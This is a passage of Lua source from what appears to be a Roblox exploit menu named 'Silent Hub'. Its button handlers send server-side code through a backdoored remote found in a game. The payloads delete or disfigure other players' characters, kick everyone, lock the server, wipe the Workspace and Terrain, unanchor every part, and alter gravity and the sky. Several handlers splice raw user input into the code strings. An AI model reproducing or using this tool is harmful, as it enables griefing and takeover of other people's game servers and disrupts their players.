	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Parent = nil
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
			player.Character.Parent = nil
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.Parent = nil
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_5a);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_5d()
local script = G2L["5d"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.Health = math.huge
		player.Character.Humanoid.MaxHealth = math.huge
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
			player.Character.Humanoid.Health = math.huge
		player.Character.Humanoid.MaxHealth = math.huge
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.Humanoid.Health = math.huge
		player.Character.Humanoid.MaxHealth = math.huge
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_5d);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_60()
local script = G2L["60"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.Health = 100
		player.Character.Humanoid.MaxHealth = 100
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
		player.Character.Humanoid.Health = 100
		player.Character.Humanoid.MaxHealth = 100
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
		player.Character.Humanoid.Health = 100
		player.Character.Humanoid.MaxHealth = 100
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_60);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_63()
local script = G2L["63"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Shirt') or v:IsA('Pants') then
				v:destroy()
			elseif v:IsA('ShirtGraphic') then
				v.Archivable = false
				v.Graphic = ''
			end
		end
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Accessory') then
				v:destroy()
			end
		end
		player.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
		player.Character.Torso['Right Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
		player.Character.Torso['Right Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.BrickColor = BrickColor.new('Bright green')
			end
		end
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
			for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Shirt') or v:IsA('Pants') then
				v:destroy()
			elseif v:IsA('ShirtGraphic') then
				v.Archivable = false
				v.Graphic = ''
			end
		end
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Accessory') then
				v:destroy()
			end
		end
		player.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
		player.Character.Torso['Right Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
		player.Character.Torso['Right Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.BrickColor = BrickColor.new('Bright green')
			end
		end
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Shirt') or v:IsA('Pants') then
				v:destroy()
			elseif v:IsA('ShirtGraphic') then
				v.Archivable = false
				v.Graphic = ''
			end
		end
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Accessory') then
				v:destroy()
			end
		end
		player.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
		player.Character.Torso['Right Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Shoulder'].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
		player.Character.Torso['Right Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
		player.Character.Torso['Left Hip'].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
		for i,v in pairs(player.Character:GetChildren()) do
			if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
				v.BrickColor = BrickColor.new('Bright green')
			end
		end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_63);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_66()
local script = G2L["66"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
		scale(player.Character, 0.5)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
			function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
		scale(player.Character, 0.5)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
		end
		end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
		function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
		scale(player.Character, 0.5)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_66);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.LocalScript
local function C_68()
local script = G2L["68"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local mouse = player:GetMouse()
	
	local gui = script.Parent
	local input = gui.Main.PlayerName
	
	local box
	
	mouse.Move:Connect(function()
		if not gui.Visible then
			if box then
				box:Destroy()
				box = nil
			end
			return
		end
	
		local target = mouse.Target
		if not target then return end
	
		local character = target:FindFirstAncestorOfClass("Model")
		local targetPlayer = Players:GetPlayerFromCharacter(character)
	
		if targetPlayer and targetPlayer ~= player then
			if not box then
				box = Instance.new("SelectionBox")
				box.LineThickness = 0.15
				box.Color3 = Color3.fromRGB(0, 170, 255)
				box.Parent = character
			end
			box.Adornee = character
		else
			if box then
				box:Destroy()
				box = nil
			end
		end
	end)
	
	mouse.Button1Down:Connect(function()
		if not gui.Visible then return end
	
		if box and box.Adornee then
			local targetPlayer = Players:GetPlayerFromCharacter(box.Adornee)
			if targetPlayer then
				input.Text = targetPlayer.Name
			end
		end
	end)
end;
task.spawn(C_68);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_70()
local script = G2L["70"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local h = Instance.new("Hint")
		h.Text = ]] .. [["]] .. text .. [["
		h.Parent = game.Workspace
		wait(4)
		h:Destroy()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_70);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_73()
local script = G2L["73"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local h = Instance.new("Message")
		h.Text = ]] .. [["]] .. text .. [["
		h.Parent = game.Workspace
		wait(4)
		h:Destroy()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_73);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_76()
local script = G2L["76"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		for i, v in pairs(game.Players:GetPlayers()) do
			v:Kick("The game has been shutdown.")
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_76);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_79()
local script = G2L["79"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Players.PlayerAdded:Connect(function(player)
		player:Kick("The server is locked.")
		end)
		local h = Instance.new("Hint")
		h.Text = "The server has been locked."
		h.Name = "Hint"
		h.Parent = game.Workspace
		wait(3)
		h:Destroy()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_79);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_7c()
local script = G2L["7c"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Workspace:ClearAllChildren()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_7c);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_7f()
local script = G2L["7f"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_7f);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_82()
local script = G2L["82"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Workspace.Terrain:ClearAllChildren()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_82);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_85()
local script = G2L["85"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		game.Workspace.Gravity = ]] .. text .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_85);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
local function C_88()
local script = G2L["88"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local code = [[
		local id = "rbxassetid://]] .. input.Text .. [["
		local sky = Instance.new("Sky")
		sky.SkyboxBk = id
		sky.SkyboxDn = id
		sky.SkyboxFt = id
		sky.SkyboxLf = id
		sky.SkyboxRt = id
		sky.SkyboxUp = id
		sky.Parent = game.Lighting
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
